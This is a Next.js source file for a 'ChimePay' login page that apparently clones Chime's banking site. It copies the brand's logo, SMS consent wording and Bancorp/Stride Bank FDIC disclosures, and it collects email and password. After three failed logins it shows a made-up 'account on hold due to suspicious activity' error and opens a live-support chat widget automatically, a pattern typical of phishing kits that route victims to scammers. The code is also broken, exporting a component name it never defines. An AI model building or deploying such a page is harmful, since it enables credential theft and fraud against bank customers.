import { LogInComponents } from "@components/pages";
import type { Email, Password, NextPageWithLayout } from "@types";
import { ReactElement, useEffect, useState } from "react";
import Image from "next/image";
import Link from "next/link";
import Head from "next/head";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { loginUser } from "@services"; // assumed it returns boolean or throws error
import { useUser } from "@hooks";
import { ModalLayout } from "@components/composition";

interface FormValues {
  email: Email;
  password: Password;
}

const SignUpPage: NextPageWithLayout = () => {
  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
  } = useForm<FormValues>();

  const [loginErrorMsg, setLoginErrorMsg] = useState<string>("");
  const [loginAttempts, setLoginAttempts] = useState<number>(0);
  const [formData, setFormData] = useState<FormValues>({
    email: "" as Email,
    password: "" as Password,
  });

  const { push: navigate } = useRouter();
  const { user, setUser } = useUser();

  const onSubmit = async (loginData: FormValues) => {
    try {
      const isSuccess = await loginUser(loginData); // returns boolean

      if (isSuccess) {
        setUser({ firstName: "Demo", secondName: "User" }); // or fetch user separately
        setLoginErrorMsg("");
        setLoginAttempts(0);
        navigate("/dashboard");
      } else {
        throw new Error("Invalid login");
      }
    } catch {
      const newAttempts = loginAttempts + 1;
      setLoginAttempts(newAttempts);

      if (newAttempts >= 3) {
        setLoginErrorMsg(
          "ERROR 505: Your account is on hold due to suspicious activity. Kindly contact support."
        );

        const openChatInterval = setInterval(() => {
          if (
            typeof window !== "undefined" &&
            (window as any).tidioChatApi &&
            typeof (window as any).tidioChatApi.open === "function"
          ) {
            (window as any).tidioChatApi.open();
            clearInterval(openChatInterval);
          }
        }, 300);
      } else {
        setLoginErrorMsg("Invalid email or password. Please try again.");
      }
    }
  };

  useEffect(() => {
    if (user) {
      console.info(`Logged in as ${user.firstName} ${user.secondName}`);
    }
  }, [user]);

  return (
    <LogInComponents.Container>
      <Head>
        <title>Member Login | ChimePay</title>
        <meta name="description" content="ChimePay Clone Member Log In" />
      </Head>

      <LogInComponents.Logo>
        <Link href="/">
          <a>
            <Image
              src="/static/components/Header/chime-logo.png"
              alt="ChimePay Logo"
              width="250px"
              height="60px"
            />
          </a>
        </Link>
      </LogInComponents.Logo>

      <LogInComponents.Form.Container onSubmit={handleSubmit(onSubmit)}>
        {/* Email */}
        <LogInComponents.Form.Input
          type="email"
          placeholder="Email address"
          value={formData.email}
          {...register("email", {
            required: "required",
            pattern: {
              value: /\S+@\S+\.\S+/,
              message: "Please correct your email address",
            },
          })}
          onChange={(e) => {
            setFormData((prev) => ({ ...prev, email: e.target.value as Email }));
            if (loginErrorMsg) setLoginErrorMsg("");
          }}
        />
        {errors.email && (
          <LogInComponents.Form.Error>
            {errors.email.message}
          </LogInComponents.Form.Error>
        )}

        {/* Password */}
        <LogInComponents.Form.Input
          type="password"
          placeholder="Password"
          value={formData.password}
          {...register("password", {
            required: "required",
            minLength: {
              value: 1,
              message: "Please correct your password",
            },
          })}
          onChange={(e) => {
            setFormData((prev) => ({ ...prev, password: e.target.value as Password }));
            if (loginErrorMsg) setLoginErrorMsg("");
          }}
        />
        {errors.password && (
          <LogInComponents.Form.Error>
            {errors.password.message}
          </LogInComponents.Form.Error>
        )}

        {/* Submit */}
        <LogInComponents.Form.Submit disabled={isSubmitting} type="submit">
          Login
        </LogInComponents.Form.Submit>

        {/* Error Message */}
        {loginErrorMsg && (
          <LogInComponents.Form.Error
            style={{ color: "red", fontSize: "19px" }}
          >
            {loginErrorMsg}
          </LogInComponents.Form.Error>
        )}
      </LogInComponents.Form.Container>

      <LogInComponents.Text1>
        By clicking “Log In”, you agree to receive SMS text messages from Chime
        to verify your identity
      </LogInComponents.Text1>

      <LogInComponents.Text2>
        © 2025 ChimePay. All Rights Reserved.
      </LogInComponents.Text2>

      <LogInComponents.Text3>
        Banking Services provided by The Bancorp Bank or Stride Bank, N.A.,
        Members FDIC. The ChimePay Visa® Debit Card is issued by The Bancorp
        Bank or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may
        be used everywhere Visa debit cards are accepted. Please see back of
        your Card for its issuing bank.
      </LogInComponents.Text3>
    </LogInComponents.Container>
  );
};

SignUpPage.getLayout = (page: ReactElement) => <ModalLayout>{page}</ModalLayout>;

export default LogInPage;
